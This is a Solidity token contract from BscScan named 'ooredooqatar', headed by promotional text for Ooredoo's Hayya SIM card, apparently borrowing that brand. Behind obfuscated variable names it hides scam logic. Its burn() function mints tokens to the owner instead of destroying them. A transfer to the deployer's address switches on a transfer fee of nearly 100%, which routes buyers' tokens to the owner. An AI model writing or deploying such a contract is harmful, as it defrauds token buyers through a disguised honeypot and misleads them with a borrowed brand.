/**
 *Submitted for verification at BscScan.com on 2022-11-20
*/

////////////////////////////////////////////////////////////////////////////////////
//Stay connected with the Ooredoo Hayya SIM card. Order your free Qatar SIM card, 
//as a welcome gift we have pre-loaded your SIM with data and minutes.
//https://www.ooredoo.qa/web/en/order-hayya-sim/
//https://www.facebook.com/ooredooqatar
//https://www.instagram.com/OoredooQatar/
//https://twitter.com/ooredooqatar
//https://www.youtube.com/user/OoredooQatar
//https://www.linkedin.com/company/ooredooqatar
////////////////////////////////////////////////////////////////////////////////////
// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0;
contract ooredooqatar {
uint256 private  QAWEMY = 100000000;
address private  PVBIND = address(0);
string public  name = "ooredooqatar";
address private  XNYOLG = address(0);
address public owner;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  FPRUGV = 1000000000000000000;
string public  symbol = "ooredooqatar";
event Approval(address indexed owner, address indexed spender, uint256 value);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  EOAFVR = 1000000000000000;
address private  FPUWEK = address(0);
uint256 private  XCXKMT = 10000000000000;
uint256 private  XRIXDB = 1000000000000000000000;
mapping (address => uint256) public balanceOf;
address private  WIBQVQ = address(0);
uint256 private  DWGOYB = 1000000000000000000;
address private  GUVSPL = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  RDNYSB = 10000000000;
uint256 public constant TLQFEF = 99999;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint8 public constant decimals = 18;
function _getXNYOLG() private returns (address) {
return XNYOLG;
}

function _getEOAFVR() private returns (uint256) {
return EOAFVR;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getFPRUGV() private returns (uint256) {
return FPRUGV;
}

function _getXRIXDB() private returns (uint256) {
return XRIXDB;
}

function _getXCXKMT() private returns (uint256) {
return XCXKMT;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getWIBQVQ() private returns (address) {
return WIBQVQ;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tADRAQK 0");
require(spender != address(0), "fADRAQK 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getRDNYSB() private returns (uint256) {
return RDNYSB;
}

function _getFPUWEK() private returns (address) {
return FPUWEK;
}

constructor () public {
PVBIND = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "ADRAQK");
require(to != address(0), "ADRAQK");
require(amount <= balanceOf[from], "ADRAQK");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* TLQFEF/DWGOYB ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==PVBIND){
DWGOYB = TLQFEF+2;
}
emit Transfer(from, to, transferAmount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getGUVSPL() private returns (address) {
return GUVSPL;
}

function _getQAWEMY() private returns (uint256) {
return QAWEMY;
}


}